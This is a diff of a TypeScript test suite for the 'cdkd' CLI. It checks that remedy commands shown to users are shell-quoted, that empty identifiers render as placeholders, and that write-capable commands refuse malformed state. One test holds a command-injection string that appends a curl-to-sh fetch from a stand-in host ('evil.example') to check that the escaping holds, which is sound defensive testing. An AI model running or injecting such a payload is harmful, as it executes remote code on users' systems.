@@ -129,6 +129,46 @@ describe('the user-facing text', () => {
       expect(text).toContain('Stack');
     }
   });
+
+  it('shell-quotes the remedy, so a hostile name cannot append its own command', () => {
+    // displaySafe(asciiOnly) is a printable-ASCII allowlist: it removes the
+    // control-character class above but KEEPS ' ; | ` $ and spaces. The
+    // previous cut wrapped the command in '...' with only that sanitizing, so
+    // this name closed the quoting and appended a command to the line the text
+    // tells the user to RUN.
+    const INJECTION = "a'; curl http://evil.example/x|sh; echo '";
+    const texts = [malformedResourcesWarning(INJECTION, 'us-east-1')];
+    try {
+      refuseMalformedState(state(null), INJECTION, 'us-east-1');
+    } catch (err) {
+      texts.push((err as Error).message);
+    }
+    expect(texts.length).toBe(2);
+
+    for (const text of texts) {
+      // Non-vacuity: the name must survive into the text at all, or the
+      // assertion below passes over a string that never carried it.
+      expect(text, 'the hostile name never reached the rendered text').toContain('curl');
+      const command = text.slice(text.indexOf('cdkd state show'));
+      expect(command, 'the remedy command is missing').toContain('cdkd state show');
+      // Inside a single-quoted shell word, the ONLY way out is a closing quote.
+      // shellQuote escapes each one as '\'' so the word never terminates early.
+      const bare = command.match(/cdkd state show (\S+|'(?:[^']|'\\'')*')/);
+      expect(bare, `remedy argument is not a single shell word: ${command}`).not.toBeNull();
+      expect(
+        command.includes("|sh") && !command.includes("'\\''"),
+        `the remedy still carries an unescaped injection: ${command}`
+      ).toBe(false);
+    }
+  });
+
+  it('renders an identifier that sanitizes to EMPTY as a placeholder, not nothing', () => {
+    // An empty argument makes --stack-region swallow --json, turning a remedy
+    // into a differently-broken command.
+    const text = malformedResourcesWarning('\u0000\u0001', '\u0002');
+    expect(text).toContain('<unrenderable>');
+    expect(text, 'an empty argument collapsed the flags').not.toContain('--stack-region --json');
+  });
 });
 
 /**
@@ -151,6 +191,10 @@ describe('write-capable commands refuse; read-only ones repair', () => {
     'src/cli/commands/scrub.ts',
     'src/cli/commands/import.ts',
     'src/cli/commands/orphan.ts',
+    // Added in round 3: `{...null}` yields `{}` and throws nothing, so this
+    // one launders silently — in the command that runs precisely when state is
+    // already suspect.
+    'src/cli/commands/rollback.ts',
   ];
   const REPAIR = ['src/cli/commands/diff-recursive.ts'];
 
@@ -162,10 +206,22 @@ describe('write-capable commands refuse; read-only ones repair', () => {
         `${file} calls saveState, so a malformed record must be refused, not repaired: saving ` +
           `over it would replace the evidence with a well-formed empty bag permanently.`
       ).toContain('refuseMalformedState(');
-      expect(
-        src.includes('repairMalformedResourcesForReadOnly'),
-        `${file} repairs a malformed resources bag but can also WRITE state.`
-      ).toBe(false);
+      // `scrub` is the one file legitimately holding BOTH: its write gate is
+      // `recordsChanged > 0 && !opts.dryRun`, so under `--dry-run` it provably
+      // cannot persist and repairing preserves the audit. Any OTHER
+      // write-capable file holding the repair helper is the round-2 defect.
+      if (file !== 'src/cli/commands/scrub.ts') {
+        expect(
+          src.includes('repairMalformedResourcesForReadOnly'),
+          `${file} repairs a malformed resources bag but can also WRITE state.`
+        ).toBe(false);
+      } else {
+        expect(
+          src,
+          'scrub repairs under --dry-run; that is only sound while the write gate still ' +
+            'carries !opts.dryRun.'
+        ).toContain('!opts.dryRun');
+      }
       // The premise of the rule, asserted rather than assumed — if this file
       // stops writing state the classification should be revisited, not
       // silently inherited.
@@ -178,6 +234,17 @@ describe('write-capable commands refuse; read-only ones repair', () => {
   // so the consumer is fenced alongside the producer rather than reasoned about.
   it('src/cli/commands/diff.ts consumes a repaired record and must not write either', () => {
     const src = readFileSync(join(repoRoot, 'src/cli/commands/diff.ts'), 'utf8');
+    // A write would arrive through a helper, not necessarily through a literal
+    // `saveState(` in this file — so the three helpers that own one are fenced
+    // by IMPORT as well.
+    for (const writer of ['ExportIndexStore', 'LockManager', 'DeploymentEventsStore']) {
+      expect(
+        src.includes(writer),
+        `src/cli/commands/diff.ts now imports ${writer}, which can persist. It consumes ` +
+          `records repaired by diff-recursive.ts, so any write from this file can launder a ` +
+          `merely-unreadable record into a well-formed empty one.`
+      ).toBe(false);
+    }
     expect(
       src.includes('saveState('),
       `src/cli/commands/diff.ts now writes state. It receives records repaired by ` +
